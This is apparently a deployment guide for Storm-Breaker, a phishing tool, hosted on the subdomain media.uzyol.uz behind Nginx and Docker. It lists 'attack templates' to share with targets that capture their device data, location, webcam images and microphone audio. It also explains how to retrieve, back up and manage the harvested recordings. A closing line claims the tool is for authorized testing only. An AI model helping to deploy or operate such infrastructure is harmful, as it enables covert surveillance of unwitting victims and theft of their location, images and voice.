# Storm-Breaker Integrated Deployment Guide
## Deploying to media.uzyol.uz with Existing Nginx

---

## Overview

This guide shows how to deploy Storm-Breaker alongside your existing services on `uzyol.uz` using:
- **Subdomain**: `media.uzyol.uz`
- **Deployment Type**: Integrated (uses your existing Nginx)
- **Docker**: App-only container (no separate Nginx)
- **Port**: 2525 (localhost only, proxied through your Nginx)

---

## Prerequisites

✅ You already have:
- Nginx running on your server (handling uzyol.uz, admin.uzyol.uz, bot.uzyol.uz, api.uzyol.uz)
- SSL certificates (wildcard `*.uzyol.uz` or individual certificates)
- Docker and Docker Compose installed
- Root or sudo access

---

## Deployment Steps

### Step 1: Configure DNS

Add an A record for the subdomain:

```
Type: A
Name: media
Value: YOUR_SERVER_IP
TTL: 300 (or default)
```

**Verify DNS propagation:**
```bash
nslookup media.uzyol.uz
# Should return your server IP
```

---

### Step 2: Start Storm-Breaker Docker Container

```bash
# Navigate to project directory
cd /home/hikmatillo/opt/Storm-Breaker

# Build and start the container
docker-compose build
docker-compose up -d

# Verify it's running on localhost:2525
curl http://localhost:2525
# Should return HTML content

# Check container status
docker-compose ps
```

The container is now running and listening on `127.0.0.1:2525` (localhost only).

---

### Step 3: Configure Your Existing Nginx

You have **3 options** depending on your Nginx setup:

#### **Option A: Single Configuration File**

If you use `/etc/nginx/nginx.conf` for everything:

```bash
# Edit main nginx config
sudo nano /etc/nginx/nginx.conf

# Add the server block from nginx-config-snippet.conf
# inside the http { ... } block

# Test configuration
sudo nginx -t

# Reload Nginx
sudo systemctl reload nginx
```

#### **Option B: Sites-Available/Sites-Enabled Structure** (Recommended)

If you use Debian/Ubuntu structure:

```bash
# Copy the config snippet
sudo cp /home/hikmatillo/opt/Storm-Breaker/nginx-config-snippet.conf \
    /etc/nginx/sites-available/media.uzyol.uz

# Create symbolic link
sudo ln -s /etc/nginx/sites-available/media.uzyol.uz \
    /etc/nginx/sites-enabled/

# Test configuration
sudo nginx -t

# Reload Nginx
sudo systemctl reload nginx
```

#### **Option C: Include Directory Structure**

If you use includes:

```bash
# Copy to includes directory
sudo cp /home/hikmatillo/opt/Storm-Breaker/nginx-config-snippet.conf \
    /etc/nginx/conf.d/media.uzyol.uz.conf

# Test configuration
sudo nginx -t

# Reload Nginx
sudo systemctl reload nginx
```

---

### Step 4: Update SSL Configuration

The config snippet assumes your SSL certificates are at:
```
/etc/letsencrypt/live/uzyol.uz/fullchain.pem
/etc/letsencrypt/live/uzyol.uz/privkey.pem
```

**If using wildcard certificate `*.uzyol.uz`:**
- ✅ No changes needed (media.uzyol.uz covered)

**If using separate certificates:**

Edit the nginx config to point to the correct certificate:

```bash
sudo nano /etc/nginx/sites-available/media.uzyol.uz
# Update these lines:
ssl_certificate /etc/letsencrypt/live/media.uzyol.uz/fullchain.pem;
ssl_certificate_key /etc/letsencrypt/live/media.uzyol.uz/privkey.pem;
```

**If you need to obtain a new certificate:**

```bash
# Stop nginx temporarily
sudo systemctl stop nginx

# Obtain certificate
sudo certbot certonly --standalone \
    --preferred-challenges http \
    --email admin@uzyol.uz \
    --agree-tos \
    -d media.uzyol.uz

# Start nginx
sudo systemctl start nginx
```

---

### Step 5: Verify Deployment

```bash
# Test HTTPS redirect
curl -I http://media.uzyol.uz
# Should return: 301 Moved Permanently → https://media.uzyol.uz

# Test HTTPS access
curl -I https://media.uzyol.uz
# Should return: 200 OK

# Check in browser
# Visit: https://media.uzyol.uz
# Should show login page (admin/admin)
```

---

## Access Points

### Admin Panel
- **URL**: `https://media.uzyol.uz`
- **Login**: `admin` / (password from storm-web/config.php)

### Attack Templates (Share with targets)
- **Device Info**: `https://media.uzyol.uz/templates/normal_data/index.html`
- **Location**: `https://media.uzyol.uz/templates/nearyou/index.html`
- **Weather Location**: `https://media.uzyol.uz/templates/weather/index.html`
- **Camera**: `https://media.uzyol.uz/templates/camera_temp/index.html`
- **Microphone**: `https://media.uzyol.uz/templates/microphone/index.html`

---

## Service Management

### Start Storm-Breaker
```bash
cd /home/hikmatillo/opt/Storm-Breaker
docker-compose up -d
```

### Stop Storm-Breaker
```bash
cd /home/hikmatillo/opt/Storm-Breaker
docker-compose down
```

### Restart Storm-Breaker
```bash
cd /home/hikmatillo/opt/Storm-Breaker
docker-compose restart
```

### View Logs
```bash
# Docker logs
docker-compose logs -f

# Nginx access logs
sudo tail -f /var/log/nginx/media.uzyol.uz-access.log

# Nginx error logs
sudo tail -f /var/log/nginx/media.uzyol.uz-error.log
```

### Update Application
```bash
cd /home/hikmatillo/opt/Storm-Breaker
git pull
docker-compose down
docker-compose build --no-cache
docker-compose up -d
```

---

## Architecture Diagram

```
Internet
    ↓
[Port 443 HTTPS]
    ↓
Your Existing Nginx Server
    ├── uzyol.uz → Your main app
    ├── admin.uzyol.uz → Admin panel (existing)
    ├── bot.uzyol.uz → Bot service (existing)
    ├── api.uzyol.uz → API service (existing)
    └── media.uzyol.uz → Reverse Proxy
            ↓
    [127.0.0.1:2525]
            ↓
    Docker Container: storm-breaker-app
    (Python + PHP)
            ↓
    Volumes (Persistent Storage):
    ├── storm-web/images/ (webcam captures)
    ├── storm-web/sounds/ (audio recordings)
    └── storm-web/log/ (PHP logs)
```

---

## File Structure

```
/home/hikmatillo/opt/Storm-Breaker/
├── docker-compose.yml           # Docker config (app-only)
├── Dockerfile                   # Docker image definition
├── nginx-config-snippet.conf    # Nginx config to add to your server
├── storm-web/                   # Web application files
│   ├── images/                  # Captured webcam images
│   ├── sounds/                  # Recorded audio files
│   ├── log/                     # PHP error logs
│   ├── templates/               # Attack templates
│   ├── config.php               # Admin credentials
│   ├── Settings.json            # App settings
│   └── check-c.json            # Session tokens
└── modules/                     # Python backend modules

/etc/nginx/
├── sites-available/
│   └── media.uzyol.uz          # Storm-Breaker nginx config
└── sites-enabled/
    └── media.uzyol.uz → ../sites-available/media.uzyol.uz
```

---

## Security Considerations

### 1. Change Admin Password
```bash
nano /home/hikmatillo/opt/Storm-Breaker/storm-web/config.php
# Change password to strong value
```

### 2. Restrict Admin Panel Access by IP

Edit `/etc/nginx/sites-available/media.uzyol.uz`:

```nginx
location / {
    # Only allow your IP to access admin panel
    location = / {
        allow YOUR_IP_ADDRESS;
        deny all;
    }

    # Templates are publicly accessible
    location /templates/ {
        allow all;
    }

    proxy_pass http://127.0.0.1:2525;
    # ... rest of config
}
```

### 3. Enable Nginx Rate Limiting

Add to your nginx config:

```nginx
# In http block
limit_req_zone $binary_remote_addr zone=storm_limit:10m rate=10r/s;

# In server block for media.uzyol.uz
location / {
    limit_req zone=storm_limit burst=20 nodelay;
    # ... rest of config
}
```

### 4. Monitor Access Logs

```bash
# Watch for suspicious activity
sudo tail -f /var/log/nginx/media.uzyol.uz-access.log | grep -E '(POST|php)'
```

---

## Troubleshooting

### Issue: "502 Bad Gateway"

**Cause**: Nginx can't connect to Docker container

**Solution**:
```bash
# Check if container is running
docker-compose ps

# Check if port 2525 is listening
sudo netstat -tlnp | grep 2525

# Restart container
docker-compose restart

# Check container logs
docker-compose logs
```

---

### Issue: "Connection refused" on localhost:2525

**Cause**: Container not exposing port correctly

**Solution**:
```bash
# Check docker-compose.yml ports mapping
cat docker-compose.yml | grep -A2 ports
# Should show: "127.0.0.1:2525:2525"

# Rebuild container
docker-compose down
docker-compose up -d

# Test from server
curl http://127.0.0.1:2525
```

---

### Issue: SSL certificate errors

**Cause**: Wrong certificate path or expired certificate

**Solution**:
```bash
# Check certificate exists
sudo ls -la /etc/letsencrypt/live/uzyol.uz/

# Check certificate validity
sudo certbot certificates

# Renew if needed
sudo certbot renew

# Reload nginx
sudo systemctl reload nginx
```

---

### Issue: Templates not loading

**Cause**: Permissions or proxy settings

**Solution**:
```bash
# Fix permissions
cd /home/hikmatillo/opt/Storm-Breaker
chmod -R 755 storm-web/templates/
chmod -R 777 storm-web/images/ storm-web/sounds/ storm-web/log/

# Restart container
docker-compose restart

# Check nginx error log
sudo tail -f /var/log/nginx/media.uzyol.uz-error.log
```

---

### Issue: "Cannot find module" errors in Docker

**Cause**: Dependencies not installed

**Solution**:
```bash
# Rebuild from scratch
docker-compose down
docker-compose build --no-cache
docker-compose up -d
```

---

## Viewing Collected Data

### Via Admin Panel
1. Go to `https://media.uzyol.uz`
2. Login with credentials
3. View data in the panel

### Via Command Line
```bash
# View captured images
ls -lah /home/hikmatillo/opt/Storm-Breaker/storm-web/images/

# View recorded audio
ls -lah /home/hikmatillo/opt/Storm-Breaker/storm-web/sounds/

# View logs
tail -f /home/hikmatillo/opt/Storm-Breaker/storm-web/log/*.log
```

### Download to Local Machine
```bash
# From your local computer
scp -r user@your-server:/home/hikmatillo/opt/Storm-Breaker/storm-web/images ./
scp -r user@your-server:/home/hikmatillo/opt/Storm-Breaker/storm-web/sounds ./
```

---

## Backup Strategy

### Automated Backup Script

Create `/home/hikmatillo/backup-storm.sh`:

```bash
#!/bin/bash
BACKUP_DIR="/home/hikmatillo/storm-backups"
DATE=$(date +%Y%m%d-%H%M%S)

mkdir -p $BACKUP_DIR

tar -czf $BACKUP_DIR/storm-backup-$DATE.tar.gz \
    /home/hikmatillo/opt/Storm-Breaker/storm-web/images \
    /home/hikmatillo/opt/Storm-Breaker/storm-web/sounds \
    /home/hikmatillo/opt/Storm-Breaker/storm-web/log

# Keep only last 7 days
find $BACKUP_DIR -name "storm-backup-*.tar.gz" -mtime +7 -delete

echo "Backup completed: storm-backup-$DATE.tar.gz"
```

**Add to crontab:**
```bash
chmod +x /home/hikmatillo/backup-storm.sh

# Run daily at 3 AM
crontab -e
# Add: 0 3 * * * /home/hikmatillo/backup-storm.sh
```

---

## Performance Optimization

### 1. Enable Gzip in Nginx

Already included in snippet, but verify:

```nginx
gzip on;
gzip_types text/plain text/css application/json application/javascript;
```

### 2. Docker Resource Limits

Edit `docker-compose.yml`:

```yaml
services:
  storm-breaker:
    # ... existing config ...
    deploy:
      resources:
        limits:
          cpus: '0.5'
          memory: 512M
```

### 3. Clean Old Data Regularly

```bash
# Delete images older than 30 days
find /home/hikmatillo/opt/Storm-Breaker/storm-web/images/ -name "*.png" -mtime +30 -delete

# Delete audio older than 30 days
find /home/hikmatillo/opt/Storm-Breaker/storm-web/sounds/ -name "*.wav" -mtime +30 -delete
```

---

## Monitoring

### Check Service Health

```bash
# Container status
docker-compose ps

# Resource usage
docker stats storm-breaker-app

# Disk usage
du -sh /home/hikmatillo/opt/Storm-Breaker/storm-web/images/
du -sh /home/hikmatillo/opt/Storm-Breaker/storm-web/sounds/
```

### Real-time Monitoring

```bash
# Watch access in real-time
sudo tail -f /var/log/nginx/media.uzyol.uz-access.log

# Watch for errors
sudo tail -f /var/log/nginx/media.uzyol.uz-error.log

# Watch Docker logs
docker-compose logs -f --tail=100
```

---

## Complete Removal

If you need to remove Storm-Breaker completely:

```bash
# Stop and remove container
cd /home/hikmatillo/opt/Storm-Breaker
docker-compose down -v

# Remove Docker image
docker rmi storm-breaker_storm-breaker

# Remove Nginx config
sudo rm /etc/nginx/sites-enabled/media.uzyol.uz
sudo rm /etc/nginx/sites-available/media.uzyol.uz
sudo nginx -t
sudo systemctl reload nginx

# Remove DNS record (A record for media.uzyol.uz)

# Optional: Remove data (WARNING: Irreversible!)
rm -rf /home/hikmatillo/opt/Storm-Breaker/storm-web/images/*
rm -rf /home/hikmatillo/opt/Storm-Breaker/storm-web/sounds/*
rm -rf /home/hikmatillo/opt/Storm-Breaker/storm-web/log/*
```

---

## SSL Certificate Renewal

### If using wildcard certificate:
Your existing certificate renewal process will cover `media.uzyol.uz` automatically.

### If using separate certificate:

```bash
# Renew specific certificate
sudo certbot renew --cert-name media.uzyol.uz

# Or renew all
sudo certbot renew

# Reload nginx
sudo systemctl reload nginx
```

**Auto-renewal** (should already be configured):
```bash
# Check certbot timer
sudo systemctl status certbot.timer

# Test renewal
sudo certbot renew --dry-run
```

---

## Support Checklist

Before asking for help, check:

- [ ] DNS resolves correctly: `nslookup media.uzyol.uz`
- [ ] Container is running: `docker-compose ps`
- [ ] Port 2525 is listening: `sudo netstat -tlnp | grep 2525`
- [ ] Nginx config is valid: `sudo nginx -t`
- [ ] SSL certificate is valid: `sudo certbot certificates`
- [ ] Checked logs: `docker-compose logs` and `tail /var/log/nginx/error.log`

---

## Quick Command Reference

```bash
# Start
docker-compose up -d

# Stop
docker-compose down

# Restart
docker-compose restart

# Logs
docker-compose logs -f

# Rebuild
docker-compose build --no-cache && docker-compose up -d

# Test Nginx config
sudo nginx -t

# Reload Nginx
sudo systemctl reload nginx

# Check status
docker-compose ps && sudo systemctl status nginx
```

---

**Remember: This tool is for authorized security testing only. Ensure legal compliance before deployment.**
